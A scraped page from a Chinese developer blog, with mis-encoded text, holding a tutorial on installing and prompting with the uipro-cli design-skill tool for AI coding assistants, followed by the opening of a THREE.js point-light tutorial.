12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦å‘ç°ï¼ŒAI å†™çš„ä»£ç é€»è¾‘è™½ç„¶å®Œç¾ï¼Œä½†ç•Œé¢æ€»æ˜¯é€ç€ä¸€è‚¡â€œç¨‹åºå‘˜å‘³â€ï¼Ÿé…è‰²è¾£çœ¼ã€å¸ƒå±€ç”Ÿç¡¬ã€å­—ä½“ä¹±ç”¨â€¦â€¦</p>
<p><strong>UI-UX-Pro-Max-Skill</strong> å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œç”Ÿçš„ã€‚å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»£ç åº“ï¼Œæ›´æ˜¯ç»™ AI è£…ä¸Šçš„ä¸€ä¸ª<strong>ä¸“ä¸šè®¾è®¡å¤§è„‘</strong>ã€‚å®ƒåŒ…å« <strong>67+ UI é£æ ¼</strong>ã€<strong>96+ è¡Œä¸šé…è‰²</strong> å’Œ <strong>100+ æ¨ç†è§„åˆ™</strong>ï¼Œè®© AI èƒ½å¤Ÿåƒèµ„æ·±è®¾è®¡å¸ˆä¸€æ ·æ€è€ƒã€‚</p>
<p>æœ¬æ–‡æ•™ä½  <strong>30ç§’å®‰è£…</strong>ï¼Œ<strong>3åˆ†é’Ÿä¸Šæ‰‹</strong>ï¼Œè®©ä½ çš„ AI äº§å‡ºä¸“ä¸šçº§ UIã€‚</p>
<h2 data-id="heading-0">1. æé€Ÿå®‰è£… (30ç§’)</h2>
<p>ä¸éœ€è¦ä¸‹è½½æºç ï¼Œä¸éœ€è¦é…ç½® Python ç¯å¢ƒï¼Œç›´æ¥ç”¨ CLI å·¥å…·ä¸€é”®é›†æˆã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å…¨å±€å®‰è£…å·¥å…·</span>
npm install -g uipro-cli

<span class="hljs-comment"># 2. ä¸ºä½ çš„ AI åŠ©æ‰‹æ³¨å…¥çµé­‚ (æŒ‰éœ€é€‰æ‹©)</span>
uipro init --ai claude      <span class="hljs-comment"># Claude Code ç”¨æˆ·</span>
uipro init --ai trae        <span class="hljs-comment"># Trae ç”¨æˆ·</span>
uipro init --ai cursor      <span class="hljs-comment"># Cursor ç”¨æˆ·</span>
uipro init --ai windsurf    <span class="hljs-comment"># Windsurf ç”¨æˆ·</span>
</code></pre>
<p><em>çœ‹åˆ° <code>Success</code> æç¤ºåï¼Œä½ çš„ AI å°±å·²ç»å­¦ä¼šè¿™é¡¹æŠ€èƒ½äº†ï¼</em></p>
<h2 data-id="heading-1">2. å®æˆ˜ç”¨æ³• (ç›´æ¥æŠ„ä½œä¸š)</h2>
<p>å®‰è£…å¥½åï¼Œä½ <strong>ä¸éœ€è¦</strong>æ•²ä»»ä½•å¤æ‚çš„å‘½ä»¤ï¼Œåªéœ€è¦å­¦ä¼šæ€ä¹ˆè·Ÿ AI <strong>â€œè¯´é»‘è¯â€</strong>ã€‚</p>
<h3 data-id="heading-2">åœºæ™¯ Aï¼šä»é›¶è®¾è®¡ä¸€ä¸ªæ–°äº§å“ (æœ€å¸¸ç”¨)</h3>
<p>å½“ä½ éœ€è¦ AI å†™ä¸€ä¸ªå®Œæ•´çš„é¡µé¢æ—¶ï¼Œç›´æ¥å¥—ç”¨è¿™ä¸ªå…¬å¼ï¼š</p>
<blockquote>
<p><strong>Prompt å…¬å¼</strong>ï¼š<code>äº§å“ç±»å‹</code> + <code>è¡Œä¸š/é£æ ¼</code> + <code>ç”Ÿæˆè®¾è®¡ç³»ç»Ÿ</code></p>
</blockquote>
<p><strong>ç›´æ¥å¤åˆ¶è¿™æ®µè¯ç»™ AIï¼š</strong></p>
<blockquote>
<p>"å¸®æˆ‘è®¾è®¡ä¸€ä¸ª<strong>å® ç‰©é¢†å…» App</strong> çš„è½åœ°é¡µï¼Œé£æ ¼è¦<strong>æ¸©é¦¨ã€å¯çˆ±</strong>ã€‚è¯·å…ˆåŸºäº UI-UX-Pro-Max ç”Ÿæˆä¸€å¥—è®¾è®¡ç³»ç»Ÿï¼Œç„¶åå†å†™ä»£ç ã€‚"
è¿™æ˜¯æˆ‘ä¸€å¥è¯ç”Ÿæˆçš„æ•ˆæœï¼Œå®Œå…¨æ²¡æœ‰å¾®è°ƒï¼Œå¦‚æœå†è°ƒæ•´ä¸€ä¸‹ç»†èŠ‚çš„è¯ï¼Œå¯ä»¥æƒ³è±¡æœ‰å¤šä¹ˆç‚¸è£‚å§ï¼ï¼ï¼ï¼</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a34f002a153b4f80ae7332448e668dfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYVpoZeeahOWFqOagiOefpeivhuWIhuS6qw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770728415&amp;x-signature=VxDq2cdh8P%2FhFcBbILEXs4ZTPao%3D" alt="image.png" loading="lazy"/>
<strong>AI çš„ååº”ï¼š</strong></p>
<ol>
<li><strong>è‡ªåŠ¨æ¨ç†</strong>ï¼šè¯†åˆ«åˆ°â€œå® ç‰©â€ï¼Œè‡ªåŠ¨æ¨è <strong>åœ†è§’å¡ç‰‡ (Claymorphism)</strong> é£æ ¼ã€‚</li>
<li><strong>è‡ªåŠ¨é…è‰²</strong>ï¼šç”Ÿæˆ <strong>æš–é»„ (#F59E0B)</strong> æ­é… <strong>æŸ”ç™½</strong> çš„é…è‰²æ–¹æ¡ˆã€‚</li>
<li><strong>è‡ªåŠ¨æ’ç‰ˆ</strong>ï¼šé€‰æ‹© <strong>Nunito (åœ†ä½“)</strong> å­—ä½“ã€‚</li>
<li><strong>ç”Ÿæˆä»£ç </strong>ï¼šäº§å‡ºå®Œå…¨ç¬¦åˆä¸Šè¿°è§„èŒƒçš„ Tailwind ä»£ç ã€‚</li>
</ol>
<h3 data-id="heading-3">åœºæ™¯ Bï¼šåªæƒ³è¦ä¸ªé…è‰²/çµæ„Ÿ</h3>
<p>ä½ ä¸éœ€è¦å†™ä»£ç ï¼Œåªæƒ³è®© AI ç»™ç‚¹è®¾è®¡å»ºè®®ï¼š</p>
<p><strong>ç›´æ¥é—® AIï¼š</strong></p>
<blockquote>
<p>"é€‚åˆ<strong>é‡‘èç§‘æŠ€ (Fintech)</strong> äº§å“çš„é…è‰²æ–¹æ¡ˆæœ‰å“ªäº›ï¼Ÿ"
"å¸®æˆ‘æ‰¾å‡ ä¸ªé€‚åˆ<strong>èµ›åšæœ‹å…‹é£æ ¼</strong>çš„å­—ä½“æ­é…ã€‚"</p>
</blockquote>
<h3 data-id="heading-4">åœºæ™¯ Cï¼šå›¢é˜Ÿå¼€å‘ï¼Œç»Ÿä¸€é£æ ¼ (è¿›é˜¶)</h3>
<p>ä¸ºäº†é˜²æ­¢ AI ä»Šå¤©å†™å‡º A é£æ ¼ï¼Œæ˜å¤©å†™å‡º B é£æ ¼ï¼Œä½ å¯ä»¥è®©å®ƒæŠŠè§„èŒƒ<strong>å­˜ä¸‹æ¥</strong>ã€‚</p>
<p><strong>ç›´æ¥å¯¹ AI è¯´ï¼š</strong></p>
<blockquote>
<p>"ä¸ºæˆ‘çš„ <strong>SaaS åå°</strong>ç”Ÿæˆä¸€å¥—è®¾è®¡ç³»ç»Ÿï¼Œå¹¶<strong>ä¿å­˜ä¸º <code>design-system.md</code> æ–‡ä»¶</strong>ã€‚ä»¥åçš„è®¾è®¡éƒ½å‚è€ƒè¿™ä¸ªæ–‡ä»¶ã€‚"</p>
</blockquote>
<h2 data-id="heading-5">3. åŸç†è§£æï¼šå®ƒä¸ºä»€ä¹ˆè¿™ä¹ˆèªæ˜ï¼Ÿ</h2>
<p>å¾ˆå¤šåŒå­¦æ‹…å¿ƒï¼šâ€œè£…äº†è¿™ä¸ªæŠ€èƒ½ï¼Œä¼šä¸ä¼šè®© AI å˜æ…¢ï¼Ÿä¼šä¸ä¼šæµªè´¹æˆ‘çš„ Tokenï¼Ÿâ€</p>
<p><strong>å®Œå…¨ä¸ä¼šï¼</strong> è¿™ä¸ªæŠ€èƒ½é‡‡ç”¨äº†**â€œæ¸è¿›å¼æŠ«éœ²â€ (Progressive Disclosure)** çš„è®¾è®¡ç†å¿µï¼Œç®€å•è¯´å°±æ˜¯**â€œå¹³æ—¶è£…ç¡ï¼Œå«å®ƒæ‰é†’â€**ï¼š</p>
<ol>
<li><strong>å¹³æ—¶é™é»˜</strong>ï¼šå½“ä½ èŠæ™®é€šä»£ç ï¼ˆå¦‚â€œå†™ä¸ªæ’åºç®—æ³•â€ï¼‰æ—¶ï¼ŒæŠ€èƒ½<strong>å®Œå…¨ä¸åŠ è½½</strong>ï¼Œä¸å ç”¨ä»»ä½• Tokenã€‚</li>
<li><strong>æŒ‰éœ€è§¦å‘</strong>ï¼šåªæœ‰å½“ä½ æ˜ç¡®æåˆ°â€œè®¾è®¡â€ã€â€œç•Œé¢â€ã€â€œUIâ€ç­‰å…³é”®è¯æ—¶ï¼Œå®ƒæ‰ä¼šâ€œé†’æ¥â€ã€‚</li>
<li><strong>ç²¾å‡†æ³¨å…¥</strong>ï¼šå®ƒä¸ä¼šæŠŠæ•´ä¸ªæ•°æ®åº“å¡ç»™ AIï¼Œè€Œæ˜¯åªæå–ä½ å½“å‰éœ€è¦çš„ï¼ˆæ¯”å¦‚åªæå–â€œåŒ»ç–—è¡Œä¸šé…è‰²â€ï¼‰ï¼Œæœ€å¤§ç¨‹åº¦çœé’±ã€‚</li>
</ol>
<p><strong>ç®€å•è¯´ï¼šå®ƒå°±æ˜¯ AI çš„â€œå¤–æŒ‚å¤§è„‘â€ï¼Œå¹³æ—¶éšèº«ï¼Œåªåœ¨ä½ éœ€è¦è®¾è®¡æ—¶æ‰é—ªç°ã€‚</strong></p>
<h2 data-id="heading-6">4. å„å¹³å°ä½¿ç”¨å°è´´å£«</h2>
<p>è™½ç„¶æ ¸å¿ƒä½“éªŒä¸€è‡´ï¼Œä½†ä¸åŒ AI å·¥å…·ç•¥æœ‰å·®å¼‚ï¼š</p>

























<table><thead><tr><th align="left">AI å·¥å…·</th><th align="left">å…³é”®æ“ä½œ</th></tr></thead><tbody><tr><td align="left"><strong>Claude Code</strong></td><td align="left"><strong>é›¶æ“ä½œ</strong>ã€‚å®‰è£…æ’ä»¶åï¼Œç›´æ¥å¯¹è¯å³å¯è§¦å‘ã€‚</td></tr><tr><td align="left"><strong>Trae</strong></td><td align="left">å¿…é¡»åˆ‡æ¢åˆ° <strong>SOLO æ¨¡å¼</strong>ï¼ŒæŠ€èƒ½æ‰ä¼šç”Ÿæ•ˆã€‚</td></tr><tr><td align="left"><strong>Cursor / Windsurf</strong></td><td align="left">åˆå§‹åŒ–åï¼ŒAI ä¼šè‡ªåŠ¨è¯»å–é…ç½®ï¼Œç›´æ¥å¯¹è¯å³å¯ã€‚</td></tr><tr><td align="left"><strong>Codex</strong></td><td align="left">æ”¯æŒ <strong>Auto-activate</strong>ï¼Œç›´æ¥å¯¹è¯å³å¯ã€‚</td></tr></tbody></table>
<h2 data-id="heading-7">5. é¿å‘æŒ‡å—</h2>
<ol>
<li><strong>ä¸è¦æ‰‹åŠ¨è·‘è„šæœ¬</strong>ï¼šè™½ç„¶é¡¹ç›®é‡Œæœ‰å¾ˆå¤š Python è„šæœ¬ï¼Œä½†é‚£æ˜¯ç»™ AI ç”¨çš„ï¼Œä½ ä¸éœ€è¦è‡ªå·±å»ç»ˆç«¯é‡Œæ•² <code>python search.py...</code>ã€‚</li>
<li><strong>å¤šç»™ä¸šåŠ¡èƒŒæ™¯</strong>ï¼šä¸è¦åªè¯´â€œè®¾è®¡ä¸ªç½‘é¡µâ€ã€‚è¯´â€œè®¾è®¡ä¸ª<strong>åŒ»ç–—</strong>ç½‘é¡µâ€æˆ–â€œè®¾è®¡ä¸ª<strong>æ¸¸æˆ</strong>ç½‘é¡µâ€ï¼ŒAI è°ƒç”¨çš„è®¾è®¡è§„åˆ™ä¼šå®Œå…¨ä¸åŒï¼ˆåŒ»ç–—=è“/ç™½/æ´å‡€ï¼›æ¸¸æˆ=é»‘/ç´«/é…·ç‚«ï¼‰ã€‚</li>
<li><strong>æ£€æŸ¥åæ¨¡å¼</strong>ï¼šè¯¥æŠ€èƒ½ä¼šè‡ªåŠ¨å¸®ä½ æ£€æŸ¥ UX é—®é¢˜ï¼ˆæ¯”å¦‚â€œä¸è¦ç”¨ Emoji å½“å›¾æ ‡â€ï¼‰ï¼Œå¦‚æœ AI çŠ¯äº†é”™ï¼Œç›´æ¥æé†’å®ƒï¼šâ€œæ£€æŸ¥ä¸€ä¸‹ Anti-patternsâ€ã€‚</li>
</ol>
<hr/>
<p><strong>æ€»ç»“</strong>ï¼šå®‰è£… <code>uipro-cli</code> -&gt; åˆå§‹åŒ– -&gt; å‘Šè¯‰ AI ä½ è¦åšä»€ä¹ˆ -&gt; äº«å—ä¸“ä¸šçº§ UIã€‚å°±è¿™ä¹ˆç®€å•ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[THREE.js å…‰ç…§- 2]]></title>    <link>https://juejin.cn/post/7602503154505203753</link>    <guid>https://juejin.cn/post/7602503154505203753</guid>    <pubDate>2026-02-03T13:32:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505203753" data-draft-id="7602401081265209380" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="THREE.js å…‰ç…§-  2"/> <meta itemprop="keywords" content="å‰ç«¯,three.js,WebGL"/> <meta itemprop="datePublished" content="2026-02-03T13:32:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¾™çŒ«ä¸çƒ­"/> <meta itemprop="url" content="https://juejin.cn/user/4098608612778654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            THREE.js å…‰ç…§-  2
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4098608612778654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¾™çŒ«ä¸çƒ­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:32:47.000Z" title="Tue Feb 03 2026 13:32:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰ç½®è¡¥å……</h2>
<p>åœ¨å‰æ–‡çš„åŸºç¡€ä»£ç ä¹‹ä¸Š, åˆæ–°å¢äº†äº›ä»£ç </p>
<pre><code class="hljs language-js" lang="js">
  <span class="hljs-comment">// å¼§åº¦è½¬åº¦æ•°</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">DegRadHelper</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">obj, prop</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span> = obj;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">prop</span> = prop;
    }
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
      <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">MathUtils</span>.<span class="hljs-title function_">radToDeg</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">prop</span>]);
    }
    <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">v</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">prop</span>] = <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">MathUtils</span>.<span class="hljs-title function_">degToRad</span>(v);
    }
  }

  <span class="hljs-comment">// gui å¿«æ·ç»‘å®šå¯¹è±¡çš„ x y zå±æ€§</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">makeXYZGUI</span>(<span class="hljs-params">gui, vector3, name, onChangeFn</span>) {
    <span class="hljs-keyword">const</span> folder = gui.<span class="hljs-title function_">addFolder</span>(name);
    folder.<span class="hljs-title function_">add</span>(vector3, <span class="hljs-string">"x"</span>, -<span class="hljs-number">10</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(onChangeFn);
    folder.<span class="hljs-title function_">add</span>(vector3, <span class="hljs-string">"y"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(onChangeFn);
    folder.<span class="hljs-title function_">add</span>(vector3, <span class="hljs-string">"z"</span>, -<span class="hljs-number">10</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(onChangeFn);
    folder.<span class="hljs-title function_">open</span>();
  }
</code></pre>
<hr/>
<h2 data-id="heading-1"><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F%23api%2Fzh%2Flights%2FPointLight" target="_blank" title="https://threejs.org/docs/#api/zh/lights/PointLight" ref="nofollow noopener noreferrer"><code>PointLight</code></a> ç‚¹å…‰æº</h2>
<p>ç‚¹å…‰æº, è¡¨ç¤ºä»ä¸€ä¸ªç‚¹æœå‘å„ä¸ªæ–¹å‘å‘å°„å‡ºå…‰çº¿çš„ä¸€ç§å…‰ç…§æ•ˆæœ</p>
<p>å¸¸ç”¨äºæ¨¡æ‹Ÿç¯æ³¡ç¯å…‰, æœ‰é˜´å½±</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> pointColor = <span class="hljs-number">0xffffff</span>;
  <span class="hljs-keyword">const</span> pointerIntensity = <span class="hljs-number">150</span>;
  <span class="hljs-keyword">const</span> pointLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PointLight</span>(pointColor, pointerIntensity);
  pointLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);
  scene.<span class="hljs-title function_">add</span>(pointLight);

  <span class="hljs-comment">// ç‚¹å…‰æºè¾…åŠ©å™¨</span>
